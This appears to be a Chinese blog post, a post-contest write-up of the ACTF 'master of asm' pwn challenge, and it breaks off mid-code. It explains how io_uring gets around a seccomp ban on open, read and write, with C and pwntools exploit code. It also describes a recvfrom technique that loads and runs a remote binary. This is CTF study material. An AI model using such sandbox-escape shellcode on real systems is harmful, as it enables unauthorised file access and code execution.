    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>👴有罪</p><p>👴这次爆零了</p><p>回想几个月前remakeACTF2022，唯一一道remake出来的tree_pwn还是看Nameless👴的博客搓的。</p><p>不得不感叹AAA的师傅出题是真有水平，没有奇怪的脑洞，全是干货。</p><p>但这和我一道都做不出有什么关系呢，悲</p><p>😭😭😭😭😭</p><p>没有能力的人是只能赛后remake的，是没有资格享受解题的激动与喜悦的</p><p>哎，屑korey这篇remake会写的尽量详细。</p><p>真的要得玉玉症了呜呜呜</p><h1 id="0x1：Pwn-remake🤣"><a href="#0x1：Pwn-remake🤣" class="headerlink" title="0x1：Pwn remake🤣"></a>0x1：Pwn remake🤣</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>你是master🐎，反正👴不是</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>能直接执行输入的shellcode，但是，我要说但是，本题开了一个及其离谱的沙盒：</p><p><img src="/img/ACTF/0.png" alt="img"></p><p>把<code>open read write</code>及其替代品是全kill了</p><p>👴当时想的是<code>clone、fork、ptrace、lseek</code>这些都没禁，想用<code>ptrace</code>来着，后来仔细一想我真tm是个SB啊，无论是<code>fork</code>还是<code>clone</code>，创建那个新进程时sandbox已经被调用了。</p><p>然后就没有然后了，👴又想找找有没有<code>open read</code>的漏网之鱼，打个测信道，然后也没有了下文。</p><p>👴开摆了，反正👴不是master就不是吧（bushi）</p><p>比赛结束后，Nightu👴说这题一眼看出<code>io_uring</code></p><p>PS：👴当时的反应：这又是哪个🐔8玩意，怎么人与人的差别比人与狗的都大，妈妈生的</p><p>然后👴就去找资料了解<code>io_uring</code>了</p><h3 id="What-‘s-io-uring"><a href="#What-‘s-io-uring" class="headerlink" title="What ‘s io_uring"></a>What ‘s io_uring</h3><p><code>io_uring</code>是<code>linux</code>从内核版本5.1开始引入的高性能异步I&#x2F;O框架</p><p>具体的可以看<a href="https://arthurchiao.art/blog/intro-to-io-uring-zh/#25-io_uring-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-api">这个</a></p><p>这边主要说一下和题目相关的</p><p>因为👴一直用CSDN上的祖传调用表，对于这三个调用号在400多的 👴是真的没印象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">三个系统调用<br>io_uring_setup<br>io_uring_register<br>io_uring_enter<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/1.png" alt="img"></p><p>其中<code>io_uring_setup</code> + <code>io_uring_enter</code>就可以完成绝大部分I&#x2F;O操作。</p><h4 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup"></a>io_uring_setup</h4><p>先用<code>io_uring_setup</code>设置异步I&#x2F;O操作的上下文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_setup</span><span class="hljs-params">(u32 entries, <span class="hljs-keyword">struct</span> io_uring_params *p)</span>;<br></code></pre></td></tr></table></figure><ul><li>创建一个 SQ(<code>submission queu</code>e, 提交队列) 和一个 CQ(<code>completed queue</code>,完成队列）</li><li><code>queue size</code> 至少 <code>entries</code> 个元素，</li><li>返回一个文件描述符，随后用于在这个 <code>io_uring</code> 实例上执行操作。</li></ul><p>SQ 和 CQ 在应用和内核之间共享，避免了在初始化和完成 I&#x2F;O 时<code>（initiating and completing I/O）</code>拷贝数据。</p><p>参数 p：</p><ul><li>应用用来配置 <code>io_uring</code>，</li><li>内核返回的 SQ&#x2F;CQ 配置信息也通过它带回来。</li></ul><p><code>io_uring_setup()</code> 成功时返回一个文件描述符<code>（fd）</code>。</p><p>应用随后可以将这个 fd 传给 <code>mmap(2)</code> 系统调用，来 <code>map the submission and completion queues</code> 或者传给 <code>to the io_uring_register() or io_uring_enter() system calls</code>.</p><h4 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter"></a>io_uring_enter</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_enter</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> to_submit, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> min_complete, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">sigset_t</span> *sig)</span>;<br></code></pre></td></tr></table></figure><p>这个系统调用用于初始化和完成<code>（initiate and complete）</code>I&#x2F;O，使用共享的 SQ 和 CQ。 单次调用同时执行：</p><ol><li>提交新的 I&#x2F;O 请求</li><li>等待 I&#x2F;O 完成</li></ol><p>参数：</p><ol><li><code>fd</code> 是 <code>io_uring_setup()</code> 返回的文件描述符；</li><li><code>to_submit</code> 指定了 SQ 中提交的 I&#x2F;O 数量；</li></ol><p><code>io_uring_enter()</code> 支持很多操作，包括：</p><ul><li>Open, close, and stat files</li><li>Read and write into multiple buffers or pre-mapped buffers</li><li>Socket I&#x2F;O operations</li><li>Synchronize file state</li><li>Asynchronously monitor a set of file descriptors</li><li>Create a timeout linked to a specific operation in the ring</li><li>Attempt to cancel an operation that is currently in flight</li><li>Create I&#x2F;O chains</li><li>Ordered execution within a chain</li><li>Parallel execution of multiple chains</li></ul><p>具体的demo可以让chatgpt帮忙写一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// 初始化参数</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 配置open操作</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// 提交open操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 配置read操作</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">4</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交read操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交write操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// 等待操作完成</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// 提交所有操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 清理</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后可以进GDB看看发生了什么</p><p>可以看到<code>io_uring_queue_init_params</code>实际是<code>io_uring_setup</code>和两个<code>mmap</code>的封装</p><p><code>io_uring_setup</code>执行后返回fd &#x3D; 3</p><p><img src="/img/ACTF/2.png" alt="img"></p><p>两个<code>mmap</code>有所不同，这个等会再讲</p><p><img src="/img/ACTF/3.png" alt="img"></p><p><img src="/img/ACTF/4.png" alt="img"></p><p>设第一个mmap出来的内存地址为<code>mmap_address1</code>，第二个mmap出来的内存地址为<code>mmap_address2</code></p><p><code>io_uring_prep_openat</code>和<code>io_uring_sqe_set_flags</code>实则在对<code>mmap_address2</code>处的sqe结构体进行设置</p><p>后面的<code>io_uring_prep_read/write</code>也是如此</p><p>翻看源码，sqe结构体具体是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> &#123;</span><br>__u8opcode;<span class="hljs-comment">/* type of operation for this sqe */</span><br>__u8flags;<span class="hljs-comment">/* IOSQE_ flags */</span><br>__u16ioprio;<span class="hljs-comment">/* ioprio for the request */</span><br>__s32fd;<span class="hljs-comment">/* file descriptor to do IO on */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64off;<span class="hljs-comment">/* offset into file */</span><br>__u64addr2;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32cmd_op;<br>__u32__pad1;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64addr;<span class="hljs-comment">/* pointer to buffer or iovecs */</span><br>__u64splice_off_in;<br>&#125;;<br>__u32len;<span class="hljs-comment">/* buffer size or number of iovecs */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">__kernel_rwf_t</span>rw_flags;<br>__u32fsync_flags;<br>__u16poll_events;<span class="hljs-comment">/* compatibility */</span><br>__u32poll32_events;<span class="hljs-comment">/* word-reversed for BE */</span><br>__u32sync_range_flags;<br>__u32msg_flags;<br>__u32timeout_flags;<br>__u32accept_flags;<br>__u32cancel_flags;<br>__u32open_flags;<br>__u32statx_flags;<br>__u32fadvise_advice;<br>__u32splice_flags;<br>__u32rename_flags;<br>__u32unlink_flags;<br>__u32hardlink_flags;<br>__u32xattr_flags;<br>__u32msg_ring_flags;<br>__u32uring_cmd_flags;<br>&#125;;<br>__u64user_data;<span class="hljs-comment">/* data to be passed back at completion time */</span><br><span class="hljs-comment">/* pack this to avoid bogus arm OABI complaints */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* index into fixed buffers, if used */</span><br>__u16buf_index;<br><span class="hljs-comment">/* for grouped buffer selection */</span><br>__u16buf_group;<br>&#125; __attribute__((packed));<br><span class="hljs-comment">/* personality to use, if used */</span><br>__u16personality;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__s32splice_fd_in;<br>__u32file_index;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16addr_len;<br>__u16__pad3[<span class="hljs-number">1</span>];<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u64addr3;<br>__u64__pad2[<span class="hljs-number">1</span>];<br>&#125;;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span><br><span class="hljs-comment"> * this field is used for 80 bytes of arbitrary command data</span><br><span class="hljs-comment"> */</span><br>__u8cmd[<span class="hljs-number">0</span>];<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在程序中leak这个结构体康康</p><p><img src="/img/ACTF/5.png" alt="img"></p><p>发现是吻合的</p><p>至于<code>io_uring_submit</code>，则是<code>io_uring_enter</code>的封装</p><p><img src="/img/ACTF/6.png" alt="img"></p><p>OK，Poc分析完毕</p><h3 id="试图手搓shellcode"><a href="#试图手搓shellcode" class="headerlink" title="试图手搓shellcode"></a>试图手搓shellcode</h3><p>笔者觉得总的流程就是<code>syscall_io_uring_setup</code>初始化上下文，两个<code>syscall_mmap</code>，设置好sqe结构体后<code>syscall_io_uring_enter</code>提交<code>submisson</code>。</p><p>But，笔者怎么搓都打不通呜呜呜&#x2F;(ㄒoㄒ)&#x2F;~~</p><p>这边放上笔者的失败品，如果有master搓通了能不能教教弟弟呜呜。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>code1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov rsi, rdx</span><br><span class="hljs-string">        add rsi, 0x500</span><br><span class="hljs-string">        mov rdi, 0x10</span><br><span class="hljs-string">        push 425</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>code2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov byte ptr [rax], 0x12</span><br><span class="hljs-string">        mov dword ptr [rax+4], 0xffffff9c</span><br><span class="hljs-string">        mov r15, 0x67616c662f2e</span><br><span class="hljs-string">        push r15</span><br><span class="hljs-string">        mov qword ptr [rax+0x10], rsp</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x40], 0x16</span><br><span class="hljs-string">        mov dword ptr [rax+0x44], 4</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x50], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x58], 0x30</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x80], 0x17</span><br><span class="hljs-string">        mov dword ptr [rax+0x84], 1</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x90], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x98], 0x30</span><br><span class="hljs-string">        mov rcx, 3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = asm(code1, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0</span>)) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x10000000</span>)) + \<br>            asm(code2, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.io_uring_enter(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>))<br><br>gdb.attach(p)<br>sl(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>能初始化但是任务提交不上去呜呜</p><h3 id="recvfrom！！"><a href="#recvfrom！！" class="headerlink" title="recvfrom！！"></a>recvfrom！！</h3><p>看了好几个师傅的wp发现都是用<code>recvfrom</code>做的，因为<code>socket、connect、recvfrom</code>都活着</p><p>先用gpt写一个poc，关掉pie，静态编译，建议加上-O3优化</p><p>用<code>mmap</code>把0x400000那边权限改了，建立socket连接后，把静态链接的程序读入0x400000处</p><p>最后jmp到传入进去的<code>main</code>函数</p><p>真tm妙啊，妈妈生的</p><p>Poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// 初始化参数</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 配置open操作</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// 提交open操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 配置read操作</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">5</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交read操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交write操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// 等待操作完成</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// 提交所有操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 清理</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Socket_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 